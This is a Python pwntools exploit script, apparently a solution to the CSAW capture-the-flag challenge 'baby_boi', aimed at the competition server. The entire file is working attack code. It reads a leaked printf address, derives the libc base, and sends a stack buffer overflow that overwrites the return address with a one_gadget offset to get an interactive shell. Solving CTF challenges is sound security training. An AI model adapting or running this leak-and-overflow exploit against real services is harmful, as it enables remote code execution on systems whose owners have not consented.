#!/usr/bin/env python
from pwn import *
import string

def escape(ss):
    ret = ''
    for s in ss:
        if s not in (string.printable + string.whitespace):
            ret += '\x16' + s
        else:
            ret += s
    return ret





#r = process("./baby_boi")
r = remote('pwn.chal.csaw.io', 1005)

libc = ELF("./libc-2.27.so")
# rsp + 0x40 = NULL

one_gadget = 0x4f322
r.recvline()
printf_leak = int(r.recvline().split()[3], 16)
print(hex(printf_leak))
libc_base = printf_leak - libc.symbols['printf']
log.info('libc base @ 0x%016x', libc_base)

r.sendline(escape('A' * 0x28 + p64(libc_base + one_gadget) + "\x00" * 0x70))
log.info(enhex(r.recvline()))
r.interactive()
